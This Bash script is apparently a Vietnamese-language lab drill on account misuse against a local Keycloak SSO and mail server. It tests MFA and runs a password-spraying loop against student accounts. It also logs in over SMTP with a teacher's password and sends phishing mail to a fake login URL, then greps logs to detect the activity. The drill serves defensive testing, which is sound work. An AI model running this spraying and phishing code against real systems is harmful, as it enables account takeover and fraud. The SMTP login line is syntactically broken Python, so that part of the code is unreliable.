#!/bin/bash
# Credentials tu ../.env (copy tu env.example). Khong commit secret.
set -a; . "$(dirname "$0")/../.env" 2>/dev/null || true; set +a
CONTAIN_PW="Contained_$(openssl rand -hex 4 2>/dev/null || echo abcd1234)"
RECOVER_PW="Recovered_$(openssl rand -hex 4 2>/dev/null || echo abcd1234)"
set -u
ts(){ date -u +"%Y-%m-%dT%H:%M:%SZ"; }
KC="docker exec keycloak /opt/keycloak/bin/kcadm.sh"
$KC config credentials --server https://localhost:8443 --realm master --user admin \
  --password "${KC_ADMIN_PASSWORD:?set in .env}" --truststore /opt/keycloak/data/kc-trust.p12 --trustpass changeit >/dev/null 2>&1
CURL="curl -sk --resolve sso.uni.lab:8443:127.0.0.1"
TOK="https://sso.uni.lab:8443/realms/uni/protocol/openid-connect/token"
kc_code(){ $CURL -o /tmp/t -w '%{http_code}' -d client_id=admin-cli -d grant_type=password --data-urlencode "username=$1" --data-urlencode "password=$2" "$TOK"; }
uid(){ $KC get users -r uni -q username=$1 --fields id|grep -oE '[0-9a-f-]{36}'|head -1; }

echo "########## DIỄN TẬP D2 — DÙNG TRÁI PHÉP TÀI KHOẢN (đăng nhập / gửi email) ##########"

echo "[A] Tương phản MFA: đăng nhập CHỈ-MẬT-KHẨU vào SSO"
echo "   gv01 (nhóm có MFA) token login: http=$(kc_code gv01 "$USER_PW")"
echo "     $(grep -o '\"error_description\":\"[^\"]*\"' /tmp/t)  => BỊ CHẶN (cần OTP / chưa đủ MFA)"

echo
echo "[B $(ts)] RẢI MẬT KHẨU 'Password123' trên nhiều tài khoản SV (v1)"
# dọn khóa cũ
for u in sv02 sv03 sv04 sv05 sv06; do $KC delete attack-detection/brute-force/users/$(uid $u) -r uni >/dev/null 2>&1; done
for u in sv02 sv03 sv04 sv05 sv06; do echo "   $u: http=$(kc_code $u Password123)"; done
echo "   -- spray lặp để kích hoạt khóa (3 vòng nữa) --"
for r in 1 2 3; do for u in sv02 sv03 sv04 sv05 sv06; do kc_code $u "Guess$r$r" >/dev/null; done; done
for u in sv02 sv03; do echo "   $u brute-force: $($KC get attack-detection/brute-force/users/$(uid $u) -r uni --fields numFailures,disabled 2>/dev/null|tr -d ' \n')"; done
echo "   => v1: mật khẩu mạnh + khóa brute-force => rải mật khẩu KHÔNG chiếm được tài khoản (Q2)."

echo
echo "[C $(ts)] LẠM DỤNG GỬI THƯ qua SMTP (mật khẩu mail — KHÔNG đòi MFA)"
python3 - <<'PY'
import smtplib,ssl
ctx=ssl.create_default_context();ctx.check_hostname=False;ctx.verify_mode=ssl.CERT_NONE
try:
  s=smtplib.SMTP("127.0.0.1",587,timeout=20);s.starttls(context=ctx)
  s.login("gv01@uni.lab",""$USER_PW"")
  n=0
  for i in range(2,7):
    r=f"sv0{i}@st.uni.lab"
    s.sendmail("gv01@uni.lab",[r],
      f"From: GV01 <gv01@uni.lab>\r\nTo: {r}\r\nSubject: [Hoc bong] Nhap thong tin gap\r\n\r\nNhap tai khoan tai http://login.uni-lab.support de nhan hoc bong.\r\n");n+=1
  s.quit();print(f"   -> gửi {n} thư spam nội bộ từ gv01 qua SMTP password = THÀNH CÔNG")
except Exception as e: print("   SMTP FAIL:",str(e)[:60])
PY
echo "   => PHÁT HIỆN gap: MFA trên SSO KHÔNG chặn SMTP/IMAP (giao thức cũ dùng mật khẩu)."
echo "   => Hardening v1 đề xuất: tắt IMAP/SMTP mật khẩu cho người dùng; ratelimit gửi."

echo
echo "[D $(ts)] PHÁT HIỆN (Q3)"
echo -n "   Keycloak LOGIN_ERROR (spraying) 5 dòng cuối, username: "
docker exec keycloak sh -c 'grep LOGIN_ERROR /opt/keycloak/data/log/keycloak.log | tail -6' | grep -oE 'username="[^"]*"' | tr '\n' ' '; echo
echo -n "   mail.log gv01 gửi tới: "
docker exec dms bash -c 'grep -iE "from=<gv01@uni.lab>" /var/log/mail/mail.log | tail -6' | grep -oE 'to=<[^>]*>' | sort -u | tr '\n' ' '; echo
echo "########## HẾT D2 ##########"
